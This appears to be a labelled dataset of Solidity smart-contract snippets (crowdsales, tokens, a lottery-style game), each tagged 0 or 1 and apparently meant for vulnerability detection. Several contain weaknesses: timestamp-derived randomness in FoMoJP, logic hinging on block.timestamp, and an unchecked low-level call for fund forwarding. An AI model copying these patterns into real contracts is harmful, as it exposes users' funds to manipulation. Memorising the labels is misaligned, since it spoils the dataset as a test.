0<CODESPLIT>contract OnlyWhiteListedAddresses is Ownable {    using SafeMath for uint256;    address utilityAccount;    mapping (address => bool) whitelist;    mapping (address => address) public referrals;    modifier onlyOwnerOrUtility() {        require(msg.sender == owner || msg.sender == utilityAccount);        _;    }    event WhitelistedAddresses(        address[] users    );    event ReferralsAdded(        address[] user,        address[] referral    );    function OnlyWhiteListedAddresses(address _utilityAccount) public {        utilityAccount = _utilityAccount;    }    function whitelistAddress (address[] users) public onlyOwnerOrUtility {        for (uint i = 0; i < users.length; i++) {            whitelist[users[i]] = true;        }        WhitelistedAddresses(users);    }    function addAddressReferrals (address[] users, address[] _referrals) public onlyOwnerOrUtility {        require(users.length == _referrals.length);        for (uint i = 0; i < users.length; i++) {            require(isWhiteListedAddress(users[i]));            referrals[users[i]] = _referrals[i];        }        ReferralsAdded(users, _referrals);    }    function isWhiteListedAddress (address addr) public view returns (bool) {        return whitelist[addr];    }} 
0<CODESPLIT>contract HoldCrowdsale is CappedCrowdsale, OnlyWhiteListedAddresses {    using SafeMath for uint256;    struct TokenPurchaseRecord {        uint256 timestamp;        uint256 weiAmount;        address beneficiary;    }    uint256 transactionId = 1;    mapping (uint256 => TokenPurchaseRecord) pendingTransactions;    mapping (uint256 => bool) completedTransactions;    uint256 public referralPercentage;    uint256 public individualCap;         event TokenPurchaseRequest(        uint256 indexed transactionId,        address beneficiary,        uint256 indexed timestamp,        uint256 indexed weiAmount,        uint256 tokensAmount    );    event ReferralTokensSent(        address indexed beneficiary,        uint256 indexed tokensAmount,        uint256 indexed transactionId    );    event BonusTokensSent(        address indexed beneficiary,        uint256 indexed tokensAmount,        uint256 indexed transactionId    );    function HoldCrowdsale(        uint256 _startTime,        uint256 _endTime,        uint256 _icoHardCapWei,        uint256 _referralPercentage,        uint256 _rate,        address _wallet,        uint256 _tokensToLock,        uint256 _releaseTime,        uint256 _privateWeiRaised,        uint256 _individualCap,        address _utilityAccount    ) public    OnlyWhiteListedAddresses(_utilityAccount)    CappedCrowdsale(_icoHardCapWei, _tokensToLock, _releaseTime)    Crowdsale(_startTime, _endTime, _rate, _wallet, _privateWeiRaised)    {        referralPercentage = _referralPercentage;        individualCap = _individualCap;    }         function () external payable {        buyTokens(msg.sender);    }         function buyTokens(address beneficiary) public payable {        require(!isFinalized);        require(beneficiary == msg.sender);        require(msg.value != 0);        require(msg.value >= individualCap);        uint256 weiAmount = msg.value;        require(isWhiteListedAddress(beneficiary));        require(validPurchase(weiAmount));                 weiRaised = weiRaised.add(weiAmount);        uint256 _transactionId = transactionId;        uint256 tokensAmount = weiAmount.mul(rate);        pendingTransactions[_transactionId] = TokenPurchaseRecord(now, weiAmount, beneficiary);        transactionId += 1;        TokenPurchaseRequest(_transactionId, beneficiary, now, weiAmount, tokensAmount);        forwardFunds();    }    function issueTokensMultiple(uint256[] _transactionIds, uint256[] bonusTokensAmounts) public onlyOwner {        require(isFinalized);        require(_transactionIds.length == bonusTokensAmounts.length);        for (uint i = 0; i < _transactionIds.length; i++) {            issueTokens(_transactionIds[i], bonusTokensAmounts[i]);        }    }    function issueTokens(uint256 _transactionId, uint256 bonusTokensAmount) internal {        require(completedTransactions[_transactionId] != true);        require(pendingTransactions[_transactionId].timestamp != 0);        TokenPurchaseRecord memory record = pendingTransactions[_transactionId];        uint256 tokens = record.weiAmount.mul(rate);        address referralAddress = referrals[record.beneficiary];        token.mint(record.beneficiary, tokens);        TokenPurchase(record.beneficiary, record.weiAmount, tokens, _transactionId);        completedTransactions[_transactionId] = true;        if (bonusTokensAmount != 0) {            require(bonusTokensAmount != 0);            token.mint(record.beneficiary, bonusTokensAmount);            BonusTokensSent(record.beneficiary, bonusTokensAmount, _transactionId);        }        if (referralAddress != address(0)) {            uint256 referralAmount = tokens.mul(referralPercentage).div(uint256(100));            token.mint(referralAddress, referralAmount);            ReferralTokensSent(referralAddress, referralAmount, _transactionId);        }    }    function validPurchase(uint256 weiAmount) internal view returns (bool) {        bool withinCap = weiRaised.add(weiAmount) <= hardCap;        bool withinCrowdsaleInterval = now >= startTime && now <= endTime;        return withinCrowdsaleInterval && withinCap;    }    function forwardFunds() internal {        wallet.transfer(msg.value);    }} 
0<CODESPLIT>contract Migrations {  address public owner;  uint public last_completed_migration;  modifier restricted() {    if (msg.sender == owner) _;  }  function Migrations() public {    owner = msg.sender;  }  function setCompleted(uint completed) public restricted {    last_completed_migration = completed;  }  function upgrade(address new_address) public restricted {    Migrations upgraded = Migrations(new_address);    upgraded.setCompleted(last_completed_migration);  }}
1<CODESPLIT>contract FoMoJP {    uint256 public airDropTracker_ = 0;    function airdrop() private view returns(bool) {        uint256 seed = uint256(keccak256(abi.encodePacked((block.timestamp) / now )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return true;        else            return false;    }}
0<CODESPLIT>contract AddressesFilterFeature is Ownable {}
1<CODESPLIT>contract CrowdsaleWPTByRounds is Ownable {  using SafeMath for uint256;  using SafeERC20 for ERC20;     ERC20 public token;     address public wallet;     Token public minterContract;        uint256 public rate;     uint256 public tokensRaised;     uint256 public cap;     uint256 public openingTime;  uint256 public closingTime;     uint public minInvestmentValue;       bool public checksOn;     uint256 public gasAmount;     function setMinter(address _minterAddr) public onlyOwner {    minterContract = Token(_minterAddr);  }     modifier onlyWhileOpen {         require(block.timestamp >= openingTime && block.timestamp <= closingTime);    _;  }     event TokenPurchase(    address indexed purchaser,    address indexed beneficiary,    uint256 value,    uint256 amount    );     event TokensTransfer(    address indexed _from,    address indexed _to,    uint256 amount,    bool isDone    );constructor () public {    rate = 400;    wallet = 0xeA9cbceD36a092C596e9c18313536D0EEFacff46;    cap = 400000000000000000000000;    openingTime = 1534558186;    closingTime = 1535320800;    minInvestmentValue = 0.02 ether;        checksOn = true;    gasAmount = 25000;  }      function capReached() public view returns (bool) {    return tokensRaised >= cap;  }      function changeRate(uint256 newRate) public onlyOwner {    rate = newRate;  }      function closeRound() public onlyOwner {    closingTime = block.timestamp + 1;  }      function setToken(ERC20 _token) public onlyOwner {    token = _token;  }      function setWallet(address _wallet) public onlyOwner {    wallet = _wallet;  }      function changeMinInvest(uint256 newMinValue) public onlyOwner {    rate = newMinValue;  }      function setChecksOn(bool _checksOn) public onlyOwner {    checksOn = _checksOn;  }      function setGasAmount(uint256 _gasAmount) public onlyOwner {    gasAmount = _gasAmount;  }      function setCap(uint256 _newCap) public onlyOwner {    cap = _newCap;  }      function startNewRound(uint256 _rate, address _wallet, ERC20 _token, uint256 _cap, uint256 _openingTime, uint256 _closingTime) payable public onlyOwner {    require(!hasOpened());    rate = _rate;    wallet = _wallet;    token = _token;    cap = _cap;    openingTime = _openingTime;    closingTime = _closingTime;  }     function hasClosed() public view returns (bool) {         return block.timestamp > closingTime;  }     function hasOpened() public view returns (bool) {         return (openingTime < block.timestamp && block.timestamp < closingTime);  }              function () payable external {    buyTokens(msg.sender);  }     function buyTokens(address _beneficiary) payable public{    uint256 weiAmount = msg.value;    if (checksOn) {        _preValidatePurchase(_beneficiary, weiAmount);    }             uint256 tokens = _getTokenAmount(weiAmount);         tokensRaised = tokensRaised.add(tokens);    minterContract.mint(_beneficiary, tokens);        emit TokenPurchase(      msg.sender,      _beneficiary,      weiAmount,      tokens    );    _forwardFunds();  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount)  internal  view  onlyWhileOpen  {    require(_beneficiary != address(0));    require(_weiAmount != 0 && _weiAmount > minInvestmentValue);    require(tokensRaised.add(_getTokenAmount(_weiAmount)) <= cap);  }     function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {    token.safeTransfer(_beneficiary, _tokenAmount);  }     function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {    _deliverTokens(_beneficiary, _tokenAmount);  }     function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {    return _weiAmount.mul(rate);  }     function _forwardFunds() internal {    bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();    emit TokensTransfer (        msg.sender,        wallet,        msg.value,        isTransferDone        );  }}
1<CODESPLIT>contract MEWCrowdsale {    uint256[2] internal signatures;    address SIGN_ADDRESS1 = address(0xa5a5f62BfA22b1E42A98Ce00131eA658D5E29B37);    function changeWallet(address newWallet) public returns (bool) {        uint256 blocktime = block.timestamp;        if (msg.sender == SIGN_ADDRESS1) {            signatures[0] = blocktime;        }        return true;    }}
1<CODESPLIT>contract multiowned {    function today() private view returns (uint) {        return block.timestamp / 1 days;    }}
1<CODESPLIT>contract Pixiu {    struct exchangeRate {        uint time1;        uint time2;        uint value;    }    exchangeRate[] public exchangeRateArray;	function get_exchange_wei() constant returns(uint256){		uint len = exchangeRateArray.length;		uint nowTime = block.timestamp;        return nowTime;    }}
0<CODESPLIT>contract TimedStateMachine {    event LogSetStageStartTime(bytes32 indexed stageId, uint256 startTime);    mapping(bytes32 => uint256) internal startTime;    function setStageStartTime(bytes32 stageId, uint256 timestamp) internal {        require(timestamp > block.timestamp);        startTime[stageId] = timestamp;        LogSetStageStartTime(stageId, timestamp);        return;    }}
1<CODESPLIT>contract FreezableMintableToken is FreezableToken, MintableToken {    function mintAndFreeze(address _to, uint _amount, uint64 _until) public onlyOwner canMint returns (bool) {        totalSupply_ = totalSupply_.add(_amount);        bytes32 currentKey = toKey(_to, _until);        freezings[currentKey] = freezings[currentKey].add(_amount);        freezingBalance[_to] = freezingBalance[_to].add(_amount);        freeze(_to, _until);        emit Mint(_to, _amount);        emit Freezed(_to, _until, _amount);        emit Transfer(msg.sender, _to, _amount);        return true;    }}
0<CODESPLIT>contract Consts {    uint public constant TOKEN_DECIMALS = 0;    uint8 public constant TOKEN_DECIMALS_UINT8 = 0;    uint public constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;    string public constant TOKEN_NAME = "MissYou";    string public constant TOKEN_SYMBOL = "MIS";    bool public constant PAUSED = false;    address public constant TARGET_USER = 0x210d60d0ec127f0fff477a1b1b9424bb1c32876d;        bool public constant CONTINUE_MINTING = false;}
0<CODESPLIT>contract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable    {      event Initialized();    bool public initialized = false;    constructor() public {        init();        transferOwnership(TARGET_USER);    }        function name() public pure returns (string _name) {        return TOKEN_NAME;    }    function symbol() public pure returns (string _symbol) {        return TOKEN_SYMBOL;    }    function decimals() public pure returns (uint8 _decimals) {        return TOKEN_DECIMALS_UINT8;    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {        require(!paused);        return super.transferFrom(_from, _to, _value);    }    function transfer(address _to, uint256 _value) public returns (bool _success) {        require(!paused);        return super.transfer(_to, _value);    }        function init() private {        require(!initialized);        initialized = true;        if (PAUSED) {            pause();        }                address[1] memory addresses = [address(0x210d60d0ec127f0fff477a1b1b9424bb1c32876d)];        uint[1] memory amounts = [uint(690000000000)];        uint64[1] memory freezes = [uint64(0)];        for (uint i = 0; i < addresses.length; i++) {            if (freezes[i] == 0) {                mint(addresses[i], amounts[i]);            } else {                mintAndFreeze(addresses[i], amounts[i], freezes[i]);            }        }                if (!CONTINUE_MINTING) {            finishMinting();        }        emit Initialized();    }    }
0<CODESPLIT>contract ERC223Receiver {         function tokenFallback(address _from, uint _value, bytes _data) public;}
0<CODESPLIT>contract ERC223Basic is ERC20Basic {    function transfer(address to, uint value, bytes data) public returns (bool);    event Transfer(address indexed from, address indexed to, uint value, bytes data);}
0<CODESPLIT>contract SuccessfulERC223Receiver is ERC223Receiver {    event Invoked(address from, uint value, bytes data);    function tokenFallback(address _from, uint _value, bytes _data) public {        emit Invoked(_from, _value, _data);    }}
0<CODESPLIT>contract FailingERC223Receiver is ERC223Receiver {    function tokenFallback(address, uint, bytes) public {        revert();    }}
0<CODESPLIT>contract ERC223ReceiverWithoutTokenFallback {} 
0<CODESPLIT>contract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {    using SafeMath for uint;         function transfer(address _to, uint _value, bytes _data) public returns (bool) {                          uint codeLength;        assembly {                         codeLength := extcodesize(_to)        }        balances[msg.sender] = balances[msg.sender].sub(_value);        balances[_to] = balances[_to].add(_value);        if(codeLength > 0) {            ERC223Receiver receiver = ERC223Receiver(_to);            receiver.tokenFallback(msg.sender, _value, _data);        }        emit Transfer(msg.sender, _to, _value, _data);        return true;    }         function transfer(address _to, uint256 _value) public returns (bool) {        bytes memory empty;        return transfer(_to, _value, empty);    }}
0<CODESPLIT>contract RefundVault is Ownable {  using SafeMath for uint256;  enum State { Active, Refunding, Closed }  mapping (address => uint256) public deposited;  address public wallet;  State public state;  event Closed();  event RefundsEnabled();  event Refunded(address indexed beneficiary, uint256 weiAmount);  function RefundVault(address _wallet) public {    require(_wallet != address(0));    wallet = _wallet;    state = State.Active;  }  function deposit(address investor) onlyOwner public payable {    require(state == State.Active);    deposited[investor] = deposited[investor].add(msg.value);  }  function close() onlyOwner public {    require(state == State.Active);    state = State.Closed;    Closed();    wallet.transfer(this.balance);  }  function enableRefunds() onlyOwner public {    require(state == State.Active);    state = State.Refunding;    RefundsEnabled();  }  function refund(address investor) public {    require(state == State.Refunding);    uint256 depositedValue = deposited[investor];    deposited[investor] = 0;    investor.transfer(depositedValue);    Refunded(investor, depositedValue);  }}
0<CODESPLIT>contract Checkable {    address private serviceAccount;         bool private triggered = false;         event Triggered(uint balance);         event Checked(bool isAccident);    function Checkable() public {        serviceAccount = msg.sender;    }         function changeServiceAccount(address _account) onlyService public {        assert(_account != 0);        serviceAccount = _account;    }         function isServiceAccount() view public returns (bool) {        return msg.sender == serviceAccount;    }         function check() onlyService notTriggered payable public {        if (internalCheck()) {            emit Triggered(this.balance);            triggered = true;            internalAction();        }    }         function internalCheck() internal returns (bool);         function internalAction() internal;    modifier onlyService {        require(msg.sender == serviceAccount);        _;    }    modifier notTriggered() {        require(!triggered);        _;    }}
1<CODESPLIT>contract TemplateCrowdsale is Consts, MainCrowdsale        , BonusableCrowdsale            , RefundableCrowdsale        , CappedCrowdsale    {    event Initialized();    event TimesChanged(uint startTime, uint endTime, uint oldStartTime, uint oldEndTime);    bool public initialized = false;    function TemplateCrowdsale(MintableToken _token) public        Crowdsale(START_TIME > now ? START_TIME : now, 1546297140, 1500 * TOKEN_DECIMAL_MULTIPLIER, 0x04B21fe3FBa3E8E548EfC51013E71242a55212cF)        CappedCrowdsale(20000000000000000000000)                RefundableCrowdsale(1000000000000000000000)            {        token = _token;    }    function init() public onlyOwner {        require(!initialized);        initialized = true;        if (PAUSED) {            MainToken(token).pause();        }                address[4] memory addresses = [address(0xdadc35adc3091329a2a593a6c2ba2f1539aae965),address(0xe99d4d19b23bfe83916b346814ee06043154ae78),address(0xaae82f543abb3abda4faacb887e2f802d48ed2da),address(0xaf2bde98fe39733b0f2a89053a3060c0bf8f77da)];        uint[4] memory amounts = [uint(1500000000000000000000000),uint(5000000000000000000000000),uint(10000000000000000000000000),uint(3500000000000000000000000)];        uint64[4] memory freezes = [uint64(1577746805),uint64(1577746805),uint64(0),uint64(0)];        for (uint i = 0; i < addresses.length; i++) {            if (freezes[i] == 0) {                MainToken(token).mint(addresses[i], amounts[i]);            } else {                MainToken(token).mintAndFreeze(addresses[i], amounts[i], freezes[i]);            }        }                transferOwnership(TARGET_USER);        emit Initialized();    }         function createTokenContract() internal returns (MintableToken) {        return MintableToken(0);    }                        function setEndTime(uint _endTime) public onlyOwner {                 require(now < endTime);                 require(now < _endTime);        require(_endTime > startTime);        emit TimesChanged(startTime, _endTime, startTime, endTime);        endTime = _endTime;    }        }
1<CODESPLIT>contract VernamCrowdSale {	uint public startTime;	uint public threeHotHoursEnd;	uint constant public threeHotHoursDuration = 3 hours;	uint public firstStageEnd;	uint public firstStageDuration = 8 days;	function setTimeForCrowdsalePeriods() internal returns (uint){		startTime = block.timestamp;		threeHotHoursEnd = startTime + (threeHotHoursDuration);		firstStageEnd = threeHotHoursEnd + (firstStageDuration);		return firstStageEnd;	}}
0<CODESPLIT>contract XTVNetworkGuard {  mapping(address => bool) xtvNetworkEndorser;  modifier validateSignature(    string memory message,    bytes32 verificationHash,    bytes memory xtvSignature  ) {    bytes32 xtvVerificationHash = keccak256(abi.encodePacked(verificationHash, message));    require(verifyXTVSignature(xtvVerificationHash, xtvSignature));    _;  }  function setXTVNetworkEndorser(address _addr, bool isEndorser) public;  function verifyXTVSignature(bytes32 hash, bytes memory sig) public view returns (bool) {    address signerAddress = XTVNetworkUtils.verifyXTVSignatureAddress(hash, sig);    return xtvNetworkEndorser[signerAddress];  }}  library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {    if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}   
0<CODESPLIT>contract ERC20Token is ERC20, Ownable {  using SafeMath for uint256;        function totalSupply() public view returns (uint256) { return totalSupply_; }     function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }     function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {    require(_to != address(0));    require(_value <= balances[msg.sender]);    balances[msg.sender] = balances[msg.sender].sub(_value);    balances[_to] = balances[_to].add(_value);    emit Transfer(msg.sender, _to, _value);    return true;  }     function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {    require(_to != address(0));    require(_value <= balances[_from]);    require(_value <= allowed[_from][msg.sender]);    balances[_from] = balances[_from].sub(_value);    balances[_to] = balances[_to].add(_value);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);    emit Transfer(_from, _to, _value);    return true;  }     function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {    allowed[msg.sender][_spender] = _value;    emit Approval(msg.sender, _spender, _value);    return true;  }     function allowance(address _owner, address _spender) public view returns (uint256) {    return allowed[_owner][_spender];  }     function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool) {    allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);    return true;  }     function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool) {    uint oldValue = allowed[msg.sender][_spender];    if (_subtractedValue > oldValue) {      allowed[msg.sender][_spender] = 0;    } else {      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);    }     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);    return true;  }       function pause() onlyOwner whenNotPaused public {    paused = true;    emit Pause();  }     function unpause() onlyOwner whenPaused public {    paused = false;    emit Unpause();  }     function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {    totalSupply_ = totalSupply_.add(_amount);    balances[_to] = balances[_to].add(_amount);    emit Mint(_to, _amount);    emit Transfer(address(0), _to, _amount);    return true;  }     function finishMinting() onlyOwner canMint public returns (bool) {    mintingFinished = true;    emit MintFinished();    return true;  }}
1<CODESPLIT>contract XTVToken is XTVNetworkGuard, ERC20Token {  using SafeMath for uint256;  string public constant name = "XTV";  string public constant symbol = "XTV";  uint public constant decimals = 18;  address public fullfillTeamAddress;  address public fullfillFounder;  address public fullfillAdvisors;  address public XTVNetworkContractAddress;  bool public airdropActive;  uint public startTime;  uint public endTime;  uint public XTVAirDropped;  uint public XTVBurned;  mapping(address => bool) public claimed;    uint256 private constant TOKEN_MULTIPLIER = 1000000;  uint256 private constant DECIMALS = 10 ** decimals;  uint256 public constant INITIAL_SUPPLY = 500 * TOKEN_MULTIPLIER * DECIMALS;  uint256 public constant EXPECTED_TOTAL_SUPPLY = 1000 * TOKEN_MULTIPLIER * DECIMALS;     uint256 public constant ALLOC_TEAM = 330 * TOKEN_MULTIPLIER * DECIMALS;     uint256 public constant ALLOC_ADVISORS = 70 * TOKEN_MULTIPLIER * DECIMALS;     uint256 public constant ALLOC_FOUNDER = 100 * TOKEN_MULTIPLIER * DECIMALS;     uint256 public constant ALLOC_AIRDROP = 500 * TOKEN_MULTIPLIER * DECIMALS;  uint256 public constant AIRDROP_CLAIM_AMMOUNT = 500 * DECIMALS;  modifier isAirdropActive() {    require(airdropActive);    _;  }  modifier canClaimTokens() {    uint256 remainingSupply = balances[address(0)];    require(!claimed[msg.sender] && remainingSupply > AIRDROP_CLAIM_AMMOUNT);    _;  }  constructor(    address _fullfillTeam,    address _fullfillFounder,    address _fullfillAdvisors  ) public {    owner = msg.sender;    fullfillTeamAddress = _fullfillTeam;    fullfillFounder = _fullfillFounder;    fullfillAdvisors = _fullfillAdvisors;    airdropActive = true;    startTime = block.timestamp;    endTime = startTime + 365 days;    balances[_fullfillTeam] = ALLOC_TEAM;    balances[_fullfillFounder] = ALLOC_FOUNDER;    balances[_fullfillAdvisors] = ALLOC_ADVISORS;    balances[address(0)] = ALLOC_AIRDROP;    totalSupply_ = EXPECTED_TOTAL_SUPPLY;    emit Transfer(address(this), address(0), ALLOC_AIRDROP);  }  function setXTVNetworkEndorser(address _addr, bool isEndorser) public onlyOwner {    xtvNetworkEndorser[_addr] = isEndorser;  }     function claim(    string memory token,    bytes32 verificationHash,    bytes memory xtvSignature  )     public    isAirdropActive    canClaimTokens    validateSignature(token, verificationHash, xtvSignature)    returns (uint256)  {    claimed[msg.sender] = true;    balances[address(0)] = balances[address(0)].sub(AIRDROP_CLAIM_AMMOUNT);    balances[msg.sender] = balances[msg.sender].add(AIRDROP_CLAIM_AMMOUNT);    XTVAirDropped = XTVAirDropped.add(AIRDROP_CLAIM_AMMOUNT);    emit Transfer(address(0), msg.sender, AIRDROP_CLAIM_AMMOUNT);    return balances[msg.sender];  }     function burnTokens() public onlyOwner {    require(block.timestamp > endTime);    uint256 remaining = balances[address(0)];    airdropActive = false;    XTVBurned = remaining;  }  function setXTVNetworkContractAddress(address addr) public onlyOwner {    XTVNetworkContractAddress = addr;  }  function setXTVTokenAirdropStatus(bool _status) public onlyOwner {    airdropActive = _status;  }}
1<CODESPLIT>contract Saturn is Ownable {    using SafeMath for uint256;    struct Player {        uint256 pid;          uint256 ethTotal;          uint256 ethBalance;          uint256 ethWithdraw;          uint256 ethShareWithdraw;          uint256 tokenBalance;          uint256 tokenDay;          uint256 tokenDayBalance;      }    struct LuckyRecord {        address player;          uint256 amount;          uint64 txId;          uint64 time;                                     uint64 level;    }         struct LuckyPending {        address player;          uint256 amount;          uint64 txId;          uint64 block;          uint64 level;      }    struct InternalBuyEvent {                                                                       uint256 flag1;    }    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Buy(        address indexed _token, address indexed _player, uint256 _amount, uint256 _total,        uint256 _totalSupply, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot,        uint256 _price, uint256 _flag1    );    event Withdraw(address indexed _token, address indexed _player, uint256 _amount);    event Win(address indexed _token, address indexed _winner, uint256 _winAmount);    string constant public name = "Saturn";    string constant public symbol = "SAT";    uint8 constant public decimals = 18;    uint256 constant private FEE_REGISTER_ACCOUNT = 10 finney;      uint256 constant private BUY_AMOUNT_MIN = 1000000000;      uint256 constant private BUY_AMOUNT_MAX = 100000000000000000000000;      uint256 constant private TIME_DURATION_INCREASE = 30 seconds;      uint256 constant private TIME_DURATION_MAX = 24 hours;      uint256 constant private ONE_TOKEN = 1000000000000000000;      mapping(address => Player) public playerOf;      mapping(uint256 => address) public playerIdOf;      uint256 public playerCount;      uint256 public totalSupply;      uint256 public totalPot;      uint256 public sharePot;      uint256 public finalPot;      uint256 public luckyPot;      uint64 public txCount;      uint256 public finishTime;      uint256 public startTime;      address public lastPlayer;      address public winner;      uint256 public winAmount;      uint256 public price;      address[3] public dealers;      uint256 public dealerDay;      LuckyPending[] public luckyPendings;    uint256 public luckyPendingIndex;    LuckyRecord[] public luckyRecords;      address public feeOwner;      uint256 public feeAmount;           uint64[16] public feePrices = [uint64(88000000000000),140664279921934,224845905067685,359406674201608,574496375292119,918308169866219,1467876789325690,2346338995279770,3750523695724810,5995053579423660,9582839714125510,15317764181758900,24484798507285300,39137915352965200,62560303190573500,99999999999999100];         uint8[16] public feePercents = [uint8(150),140,130,120,110,100,90,80,70,60,50,40,30,20,10,0];         uint256 public feeIndex;         constructor(uint256 _startTime, address _feeOwner) public {        require(_startTime >= now && _feeOwner != address(0));        startTime = _startTime;        finishTime = _startTime + TIME_DURATION_MAX;        totalSupply = 0;        price = 88000000000000;        feeOwner = _feeOwner;        owner = msg.sender;    }         modifier isActivated() {        require(now >= startTime);        _;    }         modifier isAccount() {        address _address = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_address)}        require(_codeLength == 0 && tx.origin == msg.sender);        _;    }         function balanceOf(address _owner) public view returns (uint256) {        return playerOf[_owner].tokenBalance;    }         function getLuckyPendingSize() public view returns (uint256) {        return luckyPendings.length;    }         function getLuckyRecordSize() public view returns (uint256) {        return luckyRecords.length;    }         function getGameInfo() public view returns (        uint256 _balance, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot, uint256 _rewardPot, uint256 _price,        uint256 _totalSupply, uint256 _now, uint256 _timeLeft, address _winner, uint256 _winAmount, uint8 _feePercent    ) {        _balance = address(this).balance;        _totalPot = totalPot;        _sharePot = sharePot;        _finalPot = finalPot;        _luckyPot = luckyPot;        _rewardPot = _sharePot;        uint256 _withdraw = _sharePot.add(_finalPot).add(_luckyPot);        if (_totalPot > _withdraw) {            _rewardPot = _rewardPot.add(_totalPot.sub(_withdraw));        }        _price = price;        _totalSupply = totalSupply;        _now = now;        _feePercent = feeIndex >= feePercents.length ? 0 : feePercents[feeIndex];        if (now < finishTime) {            _timeLeft = finishTime - now;        } else {            _timeLeft = 0;            _winner = winner != address(0) ? winner : lastPlayer;            _winAmount = winner != address(0) ? winAmount : finalPot;        }    }         function getPlayerInfo(address _playerAddress) public view returns (        uint256 _pid, uint256 _ethTotal, uint256 _ethBalance, uint256 _ethWithdraw,        uint256 _tokenBalance, uint256 _tokenDayBalance    ) {        Player storage _player = playerOf[_playerAddress];        if (_player.pid > 0) {            _pid = _player.pid;            _ethTotal = _player.ethTotal;            uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);              _ethBalance = _player.ethBalance;            if (_sharePot > _player.ethShareWithdraw) {                _ethBalance = _ethBalance.add(_sharePot.sub(_player.ethShareWithdraw));            }            _ethWithdraw = _player.ethWithdraw;            _tokenBalance = _player.tokenBalance;            uint256 _day = (now / 86400) * 86400;            if (_player.tokenDay == _day) {                _tokenDayBalance = _player.tokenDayBalance;            }        }    }         function getDealerAndLuckyInfo(uint256 _luckyOffset) public view returns (        address[3] _dealerPlayers, uint256[3] _dealerDayTokens, uint256[3] _dealerTotalTokens,        address[5] _luckyPlayers, uint256[5] _luckyAmounts, uint256[5] _luckyLevels, uint256[5] _luckyTimes    ) {        uint256 _day = (now / 86400) * 86400;        if (dealerDay == _day) {            for (uint256 _i = 0; _i < 3; ++_i) {                if (dealers[_i] != address(0)) {                    Player storage _player = playerOf[dealers[_i]];                    _dealerPlayers[_i] = dealers[_i];                    _dealerDayTokens[_i] = _player.tokenDayBalance;                    _dealerTotalTokens[_i] = _player.tokenBalance;                }            }        }        uint256 _size = _luckyOffset >= luckyRecords.length ? 0 : luckyRecords.length - _luckyOffset;        if (_luckyPlayers.length < _size) {            _size = _luckyPlayers.length;        }        for (_i = 0; _i < _size; ++_i) {            LuckyRecord memory _record = luckyRecords[luckyRecords.length - _luckyOffset - 1 - _i];            _luckyPlayers[_i] = _record.player;            _luckyAmounts[_i] = _record.amount;            _luckyLevels[_i] = _record.level;            _luckyTimes[_i] = _record.time;        }    }         function transfer(address _to, uint256 _value) isActivated isAccount public returns (bool) {        require(_to == address(this));        Player storage _player = playerOf[msg.sender];        require(_player.pid > 0);        if (now >= finishTime) {            if (winner == address(0)) {                                 endGame();            }                         _value = 80000000000000000;        } else {                         require(_value == 80000000000000000 || _value == 10000000000000000);        }        uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);          uint256 _eth = 0;                 if (_sharePot > _player.ethShareWithdraw) {            _eth = _sharePot.sub(_player.ethShareWithdraw);            _player.ethShareWithdraw = _sharePot;        }                 _eth = _eth.add(_player.ethBalance);        _player.ethBalance = 0;        _player.ethWithdraw = _player.ethWithdraw.add(_eth);        if (_value == 80000000000000000) {                                      uint256 _fee = _eth.mul(feeIndex >= feePercents.length ? 0 : feePercents[feeIndex]).div(1000);            if (_fee > 0) {                feeAmount = feeAmount.add(_fee);                _eth = _eth.sub(_fee);            }            sendFeeIfAvailable();            msg.sender.transfer(_eth);            emit Withdraw(_to, msg.sender, _eth);            emit Transfer(msg.sender, _to, 0);        } else {                         InternalBuyEvent memory _buyEvent = InternalBuyEvent({                flag1: 0                });            buy(_player, _buyEvent, _eth);        }        return true;    }         function() isActivated isAccount payable public {        uint256 _eth = msg.value;        require(now < finishTime);        InternalBuyEvent memory _buyEvent = InternalBuyEvent({            flag1: 0            });        Player storage _player = playerOf[msg.sender];        if (_player.pid == 0) {                         require(_eth >= FEE_REGISTER_ACCOUNT);                         uint256 _fee = FEE_REGISTER_ACCOUNT.sub(BUY_AMOUNT_MIN);            _eth = _eth.sub(_fee);                         feeAmount = feeAmount.add(_fee);            playerCount = playerCount.add(1);            Player memory _p = Player({                pid: playerCount,                ethTotal: 0,                ethBalance: 0,                ethWithdraw: 0,                ethShareWithdraw: 0,                tokenBalance: 0,                tokenDay: 0,                tokenDayBalance: 0                });            playerOf[msg.sender] = _p;            playerIdOf[_p.pid] = msg.sender;            _player = playerOf[msg.sender];                         _buyEvent.flag1 += 1;        }        buy(_player, _buyEvent, _eth);    }         function buy(Player storage _player, InternalBuyEvent memory _buyEvent, 